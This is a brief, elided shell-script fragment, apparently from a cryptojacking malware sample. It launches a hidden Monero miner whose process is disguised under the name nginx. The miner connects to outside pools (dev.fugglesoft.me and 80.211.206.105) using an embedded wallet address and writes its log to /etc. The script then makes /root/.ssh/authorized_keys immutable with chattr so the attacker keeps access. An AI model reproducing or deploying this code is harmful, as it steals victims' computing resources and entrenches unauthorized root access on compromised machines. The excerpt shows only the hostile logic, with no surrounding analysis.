...
if [ -f "$rtdir" ]; then
    ...
    if ! $ps_cmd -fe | grep -q 'nginx' | grep -v 'grep'; then
        ...
        sleep 5s
        ./ --log-file=/etc/kta --keepalive --no-color --cpu-priority 5 -o dev.fugglesoft.me:5443 --tls -o 80.211.206.105:9000 -u 84nw3MQdDJzRghGBEPWNAtLG8MA1ek1itN42Yup4dPK38wnWGY7zxSR28j2n4vyLspVPoDCFeijap2NTQJfegCTeANTrzot.51 --coin monero --background &
    fi
    chmod 600 /root/.ssh/authorized_keys
    chattr +ia /root/.ssh/authorized_keys
else
